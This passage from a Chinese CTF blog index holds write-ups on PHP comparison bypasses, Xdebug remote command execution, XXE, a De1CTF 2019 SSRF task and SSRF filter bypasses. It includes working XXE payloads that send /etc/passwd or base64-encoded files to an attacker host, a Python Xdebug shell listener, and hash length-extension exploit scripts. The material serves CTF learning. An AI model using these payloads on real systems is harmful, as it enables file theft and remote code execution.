+?&gt;</code></pre><h2 id="strpos"><a href="#strpos" class="headerlink" title="strpos"></a>strpos</h2><blockquote>
+<p>strpos — 查找字符串首次出现的位置</p>
+<p>int strpos( string $haystack, mixed $needle[, int $offset = 0] )<br>返回 needle 在 haystack 中首次出现的数字位置。</p>
+<p>haystack<br>在该字符串中进行查找。 </p>
+<p>needle<br>如果 needle 不是一个字符串，那么它将被转换为整型并被视为字符的顺序值。 </p>
+<p>offset<br>如果提供了此参数，搜索会从字符串该字符数的起始位置开始统计。如果是负数，搜索会从字符串结尾指定字符数开始。<br>返回 needle 存在于 haystack 字符串起始的位置(独立于 offset)。同时注意字符串位置是从0开始，而不是从1开始的。<br>如果没找到 needle，将返回 FALSE。 </p>
+<p>7.1.0 开始支持负数的 offset。  </p>
+</blockquote>
+<p>处理数组返回NULL</p>
+<h2 id="array-search"><a href="#array-search" class="headerlink" title="array_search"></a>array_search</h2><blockquote>
+<p>array_search — 在数组中搜索给定的值，如果成功则返回首个相应的键名</p>
+<p>mixed array_search( mixed $needle, array $haystack[, bool $strict = false] )</p>
+<p>大海捞针，在大海（haystack）中搜索针（ needle 参数）。</p>
+<p>needle<br>搜索的值。<br>Note:<br>如果 needle 是字符串，则比较以区分大小写的方式进行。</p>
+<p>haystack<br>这个数组。 </p>
+<p>strict<br>如果可选的第三个参数 strict 为 TRUE，则 array_search() 将在 haystack 中检查完全相同的元素。这意味着同样严格比较 haystack 里 needle 的 类型，并且对象需是同一个实例。<br>如果找到了 needle 则返回它的键，否则返回 FALSE。 </p>
+<p>如果 needle 在 haystack 中出现不止一次，则返回第一个匹配的键。要返回所有匹配值的键，应该用 array_keys() 加上可选参数 search_value 来代替。</p>
+</blockquote>
+<pre><code>&lt;?php
+if(!is_array($_GET[&#39;test&#39;])){exit();}
+$test=$_GET[&#39;test&#39;];
+for($i=0;$i&lt;count($test);$i++){
+    if($test[$i]===&quot;admin&quot;){
+        echo &quot;error&quot;;
+        exit();
+    }
+    $test[$i]=intval($test[$i]);
+}
+if(array_search(&quot;admin&quot;,$test)===0){
+    echo &quot;flag&quot;;
+}
+else{
+    echo &quot;false&quot;;
+}
+?&gt;</code></pre><p>我们使用<code>test[]=0</code>来绕过。如果第三个参数设置为<code>TRUE</code>，进行严格过滤就不能绕过。</p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2019/08/17/Xdebug/">
+                Xdebug
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2019-08-17</span>
+            
+            
+                <a href="https://github.com/BrainLyh/2019/08/17/Xdebug/#disqus_thread" class="comments article-comment-link">Comments</a>
+            
+            
+                <span class="category">
+                    <a href="/categories/ctf/">ctf</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="Xdebug"><a href="#Xdebug" class="headerlink" title="Xdebug"></a>Xdebug</h1><p>如何确定开启动态调试？</p>
+<p>在vps上监听9000端口  <code>nc -l -vv -p 9000</code></p>
+<p>再打开一个窗口执行 <code>curl &#39;http://TARGET_IP/index.php?XDEBUG_SESSION_START=phpstrom&#39; -H &quot;X-Forwarded-For: VPS_IP&quot;</code></p>
+<p>如果此时监听窗口收到返回的xml数据则证明开启了动态调试。</p>
+<h2 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用?"></a>如何利用?</h2><p>Ricterz师傅写好了exp:</p>
+<pre><code>#!/usr/bin/python2
+import socket
+
+ip_port = (&#39;0.0.0.0&#39;,9000)
+sk = socket.socket()
+sk.bind(ip_port)
+sk.listen(10)
+conn, addr = sk.accept()
+
+while True:
+    client_data = conn.recv(1024)
+    print(client_data)
+
+    data = raw_input(&#39;&gt;&gt; &#39;)
+    conn.sendall(&#39;eval -i 1 -- %s\x00&#39; % data.encode(&#39;base64&#39;))</code></pre><p>在vps上执行脚本，然后执行上文的curl代码触发Xdebug即可任意命令执行</p>
+<p>我们首先<code>system(&#39;find /|grep flag&#39;)</code> 找一下flag在哪，然后读取</p>
+<pre><code>system(&#39;cat /home/flag.txt&#39;)</code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a href="http://0sec.com.cn/2018-05-10/" target="_blank" rel="noopener">http://0sec.com.cn/2018-05-10/</a></p>
+</blockquote>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2019/08/17/xxe/">
+                xxe
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2019-08-17</span>
+            
+            
+                <a href="https://github.com/BrainLyh/2019/08/17/xxe/#disqus_thread" class="comments article-comment-link">Comments</a>
+            
+            
+                <span class="category">
+                    <a href="/categories/ctf/">ctf</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="定义实体"><a href="#定义实体" class="headerlink" title="定义实体"></a>定义实体</h2><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;</code></pre><p>定义ANY说明接受任何元素，定义了了一个XML实体xxe，我们可以通过&amp;进行引用。XML可以写成这样，我们输出的结果中xxe被替换成了test</p>
+<pre><code>&lt;creds&gt;
+&lt;user&gt;&amp;xxe;&lt;/user&gt;
+&lt;pass&gt;mypass&lt;/pass&gt;
+&lt;/creds&gt;</code></pre><h2 id="实体引用"><a href="#实体引用" class="headerlink" title="实体引用"></a>实体引用</h2><pre><code>&amp;lt;    &lt;    小于号
+&amp;gt;    &gt;    大于号
+&amp;amp;    &amp;    和号
+&amp;apos;    &#39;    单引号
+&amp;quot;    &quot;    引号 </code></pre><h2 id="DTD-document-type-definition-文档类型定义"><a href="#DTD-document-type-definition-文档类型定义" class="headerlink" title="DTD(document type definition 文档类型定义)"></a>DTD(document type definition 文档类型定义)</h2><p>自定义XML文档的合法构建模块，可以在XML内部声明也可以外部引用。</p>
+<p><code>SYSTEM</code> 外部引用文件<br>    <!DOCTYPE note SYSTEM "XXX.XX"></p>
+<p>内部实体声明</p>
+<pre><code>&lt;!ENTITY entity-name &quot;entity-value&quot;&gt;
+
+&lt;?xml version=&#39;1.0&#39;?&gt;
+&lt;!DOCTYPE mail[
+&lt;!ELEMENT mail (message)&gt;
+&lt;!ENTITY hacker &quot;hacker&#39;s data&quot;&gt;
+]&gt;
+
+&lt;mail&gt;
+    &lt;message&gt;&amp;hacker;&lt;/message&gt;
+&lt;/mail&gt;</code></pre><p>外部实体声明</p>
+<pre><code>&lt;?xml version=&#39;1.0&#39;?&gt;
+&lt;!DOCTYPE mail[
+&lt;!ELEMENT mail (message)&gt;
+&lt;!--ENTITY hacker &quot;hacker&#39;s data&quot;--&gt;
+&lt;!ENTITY hacker SYSTEM &quot;file:///C:/Windows/win.ini&quot;&gt;
+]&gt;
+&lt;mail&gt;
+    &lt;message&gt;&amp;hacker;&lt;/message&gt;
+&lt;/mail&gt;</code></pre><p>当然我们也可以引用公用DTD，语法如下</p>
+<pre><code>&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</code></pre><p>起和SYSTEM一样的作用</p>
+<h2 id="外部声明默认协议"><a href="#外部声明默认协议" class="headerlink" title="外部声明默认协议"></a>外部声明默认协议</h2><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e93bbf00-ec17-1.png" alt></p>
+<h2 id="通用实体与参数实体"><a href="#通用实体与参数实体" class="headerlink" title="通用实体与参数实体"></a>通用实体与参数实体</h2><p>只能用在DTD和文档的内部子集中</p>
+<p><strong>通用实体</strong> <code>&amp;name;</code> 在DTD中定义，在XML中引用，如上文的示例代码。</p>
+<p><strong>参数实体</strong></p>
+<ol>
+<li>使用 <code>% name</code> 在DTD中定义，并且只能在DTD中使用<code>%name</code>引用</li>
+<li>只有在DTD文件中，参数实体的声明才能引用其他实体</li>
+<li>参数实体也可以外部引用。</li>
+</ol>
+<h2 id="有回显读本地敏感文件"><a href="#有回显读本地敏感文件" class="headerlink" title="有回显读本地敏感文件"></a>有回显读本地敏感文件</h2><p>本地服务器解析代码</p>
+<pre><code>&lt;?php
+
+    libxml_disable_entity_loader (false);
+    $xmlfile = file_get_contents(&#39;php://input&#39;);
+    $dom = new DOMDocument();
+    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
+    $creds = simplexml_import_dom($dom);
+    echo $creds;
+
+?&gt;</code></pre><p>payload</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
+&lt;!DOCTYPE creds [  
+&lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt; 
+&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</code></pre><p>成功读取到敏感文件，但是如果我们的目标文件包含特殊符号时XML解释器会生成错误，我们这样做就会报错，此时我们就使用 <code>&lt;![CDATA[</code>在参数实体中进行。</p>
+<p>payload</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
+&lt;!DOCTYPE roottag [
+&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   
+&lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;  
+&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  
+&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; 
+%dtd; ]&gt; 
+
+&lt;roottag&gt;&amp;all;&lt;/roottag&gt;</code></pre><p>evil.dtd</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; 
+&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</code></pre><p>also,we can read the file just bs64-encode</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
+    &lt;!DOCTYPE creds [  
+    &lt;!ENTITY goodies SYSTEM &quot;php://filter/read=convert.base64-encode/resource=
+file:///D:/test.txt&quot;&gt; ]&gt; 
+    &lt;creds&gt;&amp;goodies;&lt;/creds&gt;</code></pre><p>这样就算有特殊字符也不怕啦！</p>
+<h2 id="无回显读取本地敏感文件-Blind-OOB-XXE"><a href="#无回显读取本地敏感文件-Blind-OOB-XXE" class="headerlink" title="无回显读取本地敏感文件(Blind OOB XXE)"></a>无回显读取本地敏感文件(Blind OOB XXE)</h2><p>外部实体可以通过请求内部文件uri获得文件内容，那我们可以通过写两个外部参数实体来请求自己的服务器将文件内容发送到我们的服务器上</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE message [
+    &lt;!ENTITY % files SYSTEM &quot;file:///etc/passwd&quot;&gt;  
+    &lt;!ENTITY % send SYSTEM &quot;http://myip/?a=%files;&quot;&gt; 
+    %send;
+]&gt;</code></pre><p>但是这样是不行的，几乎所有的XML解析器都不会解析同级参数实体的内容。</p>
+<p>如果我们进行嵌套操作呢？</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE message [
+    &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;  
+    &lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://myip/?%file;&#39;&gt;&quot;&gt;
+    %start;
+    %send;
+]&gt;</code></pre><p>会报错 <code>PEReferences forbidden in internal subset in Entity</code>。禁止在内部实体引用参数实体。基于此我们采用引入外部DTD，在自己的服务器上加入DTD文件</p>
+<p>xml.php</p>
+<pre><code>&lt;?php
+
+libxml_disable_entity_loader (false);
+$xmlfile = file_get_contents(&#39;php://input&#39;);
+$dom = new DOMDocument();
+$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); //loadXML() 方法通过解析一个 XML 标签字符串来组成该文档。
+?&gt;</code></pre><p>test.dtd</p>
+<pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;
+&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37 send SYSTEM &#39;http://ip:9999?p=%file;&#39;&gt;&quot;&gt;</code></pre><p>payload</p>
+<pre><code>&lt;!DOCTYPE convert [ 
+&lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;
+%remote;%int;%send;
+]&gt;</code></pre><p>在payload的最后我们连续调用了三个参数实体<code>%remote;%int;%send;</code>，这就是我们的利用顺序。<code>%remote</code>先告诉解释器请求远程URL的<code>test.dtd</code>，随后<code>%int</code>调用参数实体中的<code>$file</code>，这将请求test.txt的内容并将其编码，最后调用<code>%send</code>将数据发送到vps上。</p>
+<h2 id="Exploiting-XXE-with-local-DTD-files"><a href="#Exploiting-XXE-with-local-DTD-files" class="headerlink" title="Exploiting XXE with local DTD files"></a>Exploiting XXE with local DTD files</h2><p>8/30/2019 10:47:36 AM </p>
+<p>在Ogeak-ctf里碰上一道xxe的题，<a href="http://47.107.253.140:18080/webserver/" title="题目链接" target="_blank" rel="noopener">http://47.107.253.140:18080/webserver/</a></p>
+<p>在源码里找到一段奇怪的JS</p>
+<pre><code>var data = &quot;&lt;?xml version=\&quot;1.0\&quot; ?&gt;\n&lt;request&gt;\n    &lt;status&gt;1&lt;/status&gt;\n&lt;/request&gt;&quot;;
+
+setInterval(function(){
+    $.post(&quot;callback&quot;, data);
+}, 10000);</code></pre><p>当时看不懂这是干嘛的，因为也有事也就没做了。事后再看这段代码发现是一个定时函数，每10秒post一个xml实体。我们抓包看一下</p>
+<p>在实体部分找上文的最简单的例子，不包含任何读文件的代码试一下发现返回<code>200</code>，内容异常返回<code>500</code>.</p>
+<p>听大佬说是屏蔽了外网，不允许我们请求外网服务器，只能利用本地DTD了。</p>
+<p>原理看<a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/" title="这里" target="_blank" rel="noopener">https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/</a></p>
+<p>读完大意就是如果我们找到了一个内部的DTD，我们可以强制在目标主机上调用这个本地dtd文件，在这个文件中重写上一步我们在内部DTD中找到的参数。如果我们定义了两个同名实体，只有第一个会被执行。于是我们可以利用重写的本地DTD文件触发报错来读我们的目标文件内容。</p>
+<p>like this</p>
+<pre><code>Request
+
+&lt;?xml version=&quot;1.0&quot; ?&gt;
+&lt;!DOCTYPE message [
+    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd&quot;&gt;
+
+    &lt;!ENTITY % condition &#39;aaa)&gt;
+        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;
+        &amp;#x25;eval;
+        &amp;#x25;error;
+        &lt;!ELEMENT aa (bb&#39;&gt;
+
+    %local_dtd;
+]&gt;
+&lt;message&gt;any text&lt;/message&gt;
+
+    Response
+
+java.io.FileNotFoundException: /nonexistent/
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/usr/bin/nologin
+daemon:x:2:2:daemon:/:/usr/bin/nologin
+
+(No such file or directory)</code></pre><p>Contents of sip-app_1_0.dtd</p>
+<pre><code>…
+&lt;!ENTITY % condition &quot;and | or | not | equal | contains | exists | subdomain-of&quot;&gt;
+&lt;!ELEMENT pattern (%condition;)&gt;
+…</code></pre><p>这里使用三层的实体嵌套，第二层中我们给定义参数实体的<code>%</code>进行编码，第三层中对<code>空格</code>,<code>&#39;</code>,<code>&quot;</code>,<code>&amp;</code>,<code>%</code>都进行了编码。代码里先调用<code>%local_dtd</code>，然后在对应的dtd文件中调用了<code>% condition</code>,在<code>condition</code>定义的实体中调用<code>eval</code>和<code>error</code>。在<code>error</code>的最后我们调用<code>%file</code>来获取文件内容。为什么不使用两层嵌套的原因是会报错<code>PEReferences forbidden in internal subset in Entity</code>指的是参数实体引用(Parameter Entity Reference)，禁止在内部Entity中引用参数实体。</p>
+<p>于是我们<a href="https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation" title="依据此" target="_blank" rel="noopener">依据此</a>找到一个dtd文件来利用，这个<code>fonts.dtd</code>刚好是<code>tomcat:8-jre8</code> 里有的</p>
+<pre><code>&lt;!DOCTYPE message [
+    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/xml/fontconfig/fonts.dtd&quot;&gt;
+
+    &lt;!ENTITY % expr &#39;aaa)&gt;
+        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;
+        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///abcxyz/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;
+        &amp;#x25;eval;
+        &amp;#x25;error;
+        &lt;!ELEMENT aa (bb&#39;&gt;
+
+    %local_dtd;
+]&gt;
+&lt;message&gt;&lt;/message&gt;</code></pre><p>于是我们通过构造一个错误的url将数据带出，通过报错信息得到了flag</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a href="https://xz.aliyun.com/t/3357#toc-8" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-8</a><br><a href="https://www.freebuf.com/vuls/207639.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/207639.html</a></p>
+</blockquote>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2019/08/16/De1ctf/">
+                De1ctf
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2019-08-16</span>
+            
+            
+                <a href="https://github.com/BrainLyh/2019/08/16/De1ctf/#disqus_thread" class="comments article-comment-link">Comments</a>
+            
+            
+                <span class="category">
+                    <a href="/categories/wp/">wp</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="De1ctf-2019-WP"><a href="#De1ctf-2019-WP" class="headerlink" title="De1ctf 2019 WP"></a>De1ctf 2019 WP</h1><h2 id="ssrfme"><a href="#ssrfme" class="headerlink" title="ssrfme"></a>ssrfme</h2><p>源码 </p>
+<pre><code>#! /usr/bin/env python
+#encoding=utf-8
+from flask import Flask
+from flask import request
+import socket
+import hashlib
+import urllib
+import sys
+import os
+import json
+reload(sys)
+sys.setdefaultencoding(&#39;latin1&#39;)
+
+app = Flask(__name__)
+
+secert_key = os.urandom(16)
+
+
+class Task:
+    def __init__(self, action, param, sign, ip):
+        self.action = action
+        self.param = param
+        self.sign = sign
+        self.sandbox = md5(ip)
+        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr
+            os.mkdir(self.sandbox)
+
+    def Exec(self):
+        result = {}
+        result[&#39;code&#39;] = 500
+        if (self.checkSign()):
+            if &quot;scan&quot; in self.action:
+                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;w&#39;)
+                resp = scan(self.param)
+                if (resp == &quot;Connection Timeout&quot;):
+                    result[&#39;data&#39;] = resp
+                else:
+                    print resp
+                    tmpfile.write(resp)
+                    tmpfile.close()
+                result[&#39;code&#39;] = 200
+            if &quot;read&quot; in self.action:
+                f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;r&#39;)
+                result[&#39;code&#39;] = 200
+                result[&#39;data&#39;] = f.read()
+            if result[&#39;code&#39;] == 500:
+                result[&#39;data&#39;] = &quot;Action Error&quot;
+        else:
+            result[&#39;code&#39;] = 500
+            result[&#39;msg&#39;] = &quot;Sign Error&quot;
+        return result
+
+    def checkSign(self):
+        if (getSign(self.action, self.param) == self.sign):
+            return True
+        else:
+            return False
+
+
+#generate Sign For Action Scan.
+@app.route(&quot;/geneSign&quot;, methods=[&#39;GET&#39;, &#39;POST&#39;])
+def geneSign():
+    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
+    action = &quot;scan&quot;
+    return getSign(action, param)
+
+
+@app.route(&#39;/De1ta&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])
+def challenge():
+    action = urllib.unquote(request.cookies.get(&quot;action&quot;))
+    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
+    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))
+    ip = request.remote_addr
+    if(waf(param)):
+        return &quot;No Hacker!!!!&quot;
+    task = Task(action, param, sign, ip)
+    return json.dumps(task.Exec())
+@app.route(&#39;/&#39;)
+def index():
+    return open(&quot;code.txt&quot;,&quot;r&quot;).read()
+
+
+def scan(param):
+    socket.setdefaulttimeout(1)
+    try:
+        return urllib.urlopen(param).read()[:50]
+    except:
+        return &quot;Connection Timeout&quot;
+
+
+
+def getSign(action, param):
+    return hashlib.md5(secert_key + param + action).hexdigest()
+
+
+def md5(content):
+    return hashlib.md5(content).hexdigest()
+
+
+def waf(param):
+    check=param.strip().lower()
+    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):
+        return True
+    else:
+        return False
+
+
+if __name__ == &#39;__main__&#39;:
+    app.debug = False
+    app.run(host=&#39;0.0.0.0&#39;,port=80)</code></pre><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p><code>Exec()</code>函数首先调用<code>checkSign()</code>进行md5校验，我们可以通过长度扩展攻击绕过。接下来对scan行为进行打开文本文件，调用<code>scan()</code>读取内容，然后将目标文件内容写入文件。对read行为进行刚刚写入文件的读取。</p>
+<pre><code>def Exec(self):
+    result = {}
+    result[&#39;code&#39;] = 500
+    if (self.checkSign()):
+        if &quot;scan&quot; in self.action:
+            tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;w&#39;)
+            resp = scan(self.param)
+            if (resp == &quot;Connection Timeout&quot;):
+                result[&#39;data&#39;] = resp
+            else:
+                print resp
+                tmpfile.write(resp)
+                tmpfile.close()
+            result[&#39;code&#39;] = 200
+        if &quot;read&quot; in self.action:
+            f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;r&#39;)
+            result[&#39;code&#39;] = 200
+            result[&#39;data&#39;] = f.read()
+        if result[&#39;code&#39;] == 500:
+            result[&#39;data&#39;] = &quot;Action Error&quot;
+    else:
+        result[&#39;code&#39;] = 500
+        result[&#39;msg&#39;] = &quot;Sign Error&quot;
+    return result
+
+def checkSign(self):
+    if (getSign(self.action, self.param) == self.sign):
+        return True
+    else:
+        return False</code></pre><p><code>/geneSign</code>路由负责生成Sign。同时<code>action</code>被限定为<code>scan</code></p>
+<pre><code>#generate Sign For Action Scan.
+@app.route(&quot;/geneSign&quot;, methods=[&#39;GET&#39;, &#39;POST&#39;])
+def geneSign():
+    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
+    action = &quot;scan&quot;
+    return getSign(action, param)</code></pre><p><code>/De1ta</code>路由对请求的<code>param</code>参数进行检查，然后通过对<code>Task</code>类传入相应参数打印<code>Exec()</code>函数的结果</p>
+<pre><code>@app.route(&#39;/De1ta&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])
+def challenge():
+    action = urllib.unquote(request.cookies.get(&quot;action&quot;))
+    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
+    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))
+    ip = request.remote_addr
+    if(waf(param)):
+        return &quot;No Hacker!!!!&quot;
+    task = Task(action, param, sign, ip)
+    return json.dumps(task.Exec())</code></pre><p><code>scan()</code>函数打开<code>param</code>指向的内容进行读取，这是我们利用<code>ssrf</code>的点。</p>
+<pre><code>def scan(param):
+    socket.setdefaulttimeout(1)
+    try:
+        return urllib.urlopen(param).read()[:50]
+    except:
+        return &quot;Connection Timeout&quot;</code></pre><p>getSign()函数对<code>secerty_key,param,action</code>进行md5加密。</p>
+<pre><code>def getSign(action, param):
+    return hashlib.md5(secert_key + param + action).hexdigest()</code></pre><p>代码的逻辑大体上是</p>
+<pre><code>初始化各个参数-&gt;进入Task类-&gt;执行Exec()函数-&gt;检查md5值-&gt;对参数中的action进行不同操作-&gt;dump函数执行结果</code></pre><p>我们可以通过长度扩展攻击绕过长度判断，根据提示flag在<code>/flag.txt</code>，我们可以读取这个文件，但是<code>waf()</code>对<code>gopher</code>和<code>file</code>进行过滤，我们无法利用这两个协议，根据CVE-2019-9948(urllib)<a href="https://www.cvedetails.com/cve/CVE-2019-9948/" title="CVE-2019-9948" target="_blank" rel="noopener">https://www.cvedetails.com/cve/CVE-2019-9948/</a>我们可以通过<code>local_file:///flag.txt</code>来绕过waf。</p>
+<h3 id="编写脚本"><a href="#编写脚本" class="headerlink" title="编写脚本"></a>编写脚本</h3><pre><code>import urllib,hashpumpy 
+import requests
+
+&quot;&quot;&quot;
+    hashpump(hexdigest, original_data, data_to_add, key_length) -&gt; (digest, message)
+
+    Arguments:
+        hexdigest(str):      Hex-encoded result of hashing key + original_data.
+        original_data(str):  Known data used to get the hash result hexdigest.
+        data_to_add(str):    Data to append
+        key_length(int):     Length of unknown data prepended to the hash
+
+    Returns:
+        A tuple containing the new hex digest and the new message.
+
+&quot;&quot;&quot;
+
+url = &quot;http://139.180.128.86/&quot;
+
+#get the Sign of Scan
+geneSign = &quot;geneSign?&quot;
+payload = &quot;local_file:flag.txt&quot;
+re = requests.get(url+geneSign+&quot;param=&quot;+payload).text
+print re
+
+#hash extend attack
+hashs,hashextend = hashpumpy.hashpump(re,payload+&quot;scan&quot;,&quot;read&quot;,16)
+print hashs
+action = &quot;scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%008%01%00%00%00%00%00%00read&quot;
+cookie = {
+    #&quot;action&quot;:urllib.quote(hashextend),
+    &quot;action&quot;:action,    
+    &quot;sign&quot;:hashs
+}
+print cookie
+
+
+re2 = requests.get(url+&#39;De1ta?&#39;+&quot;param=&quot;+payload,cookies=cookie)
+
+print re2.content</code></pre><p>在使用扩展攻击的时候我们需要把所得签名前面的信息去掉</p>
+<pre><code>Input Signature: 785f9921864e8704e5e44e15c8f3d6ce
+Input Data: local_file:flag.txtscan
+Input Key Length: 16
+Input Data to Add: read
+636d649a50e61e75436cc1ba50d5a003
+local_file:flag.txtscan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x008\x01\x00\x00\x00\x00\x00\x00read</code></pre><h3 id="another-way"><a href="#another-way" class="headerlink" title="another way"></a>another way</h3><p>在ctf time上看到的回答，分析的好细致<a href="https://ctftime.org/writeup/16070" target="_blank" rel="noopener">https://ctftime.org/writeup/16070</a>。这里提供了另一种思路</p>
+<blockquote>
+<p>This will allow us to read the flag into a file, but we will not be able to read it without a valid sign with the action including “read”. If we can generate a sign for the action as “readscan”, we can perform the scan and read the result in one go.</p>
+<p>Notice, geneSign() will perform an md5 hash of secret + param + action so we can pass the value of param as “flag.txtread” (the value of action will be “scan”) and generate the same hash as if we pass param as “flag.txt” and action as “readscan”.</p>
+<p>“flag.txtread”+”scan” == “flag.txt”+”readscan”</p>
+<p>You could also use a length extension attack, but this way is more simple.</p>
+<p>So our exploit is complete.</p>
+</blockquote>
+<p>这是他们编写的脚本：膜</p>
+<pre><code>import requests
+
+def geneSign(param):
+    return requests.get(&quot;http://139.180.128.86/geneSign?param=&quot;+param).text
+
+realParam = &quot;flag.txt&quot;
+
+param = realParam+&quot;read&quot;
+sign = geneSign(param)
+param = realParam
+
+action = &quot;readscan&quot;
+
+answer = requests.get(&quot;http://139.180.128.86/De1ta?param=&quot;+param, cookies={&quot;action&quot;:action,&quot;sign&quot;:sign}).text
+
+print(answer)</code></pre>
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2019/08/16/SSRF/">
+                redis与ssrf
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2019-08-16</span>
+            
+            
+                <a href="https://github.com/BrainLyh/2019/08/16/SSRF/#disqus_thread" class="comments article-comment-link">Comments</a>
+            
+            
+                <span class="category">
+                    <a href="/categories/ctf/">ctf</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h3><h3 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen"></a>fsockopen</h3><h3 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec"></a>curl_exec</h3><h1 id="绕过IP限制"><a href="#绕过IP限制" class="headerlink" title="绕过IP限制"></a>绕过IP限制</h1><ul>
+<li>添加端口 127.0.0.1:80</li>
+<li>短网址 <a href="http://sina.lt/" title="短网址" target="_blank" rel="noopener">http://sina.lt/</a></li>
+<li>指向任意IP的域名 <a href="xip.io">xip.io</a></li>
+<li>进制转换，点分十进制，八进制，二进制，十六进制，不同进制组合</li>
+</ul>
+<h2 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h2><p>结合<code>dict://  file://  gopher://</code></p>
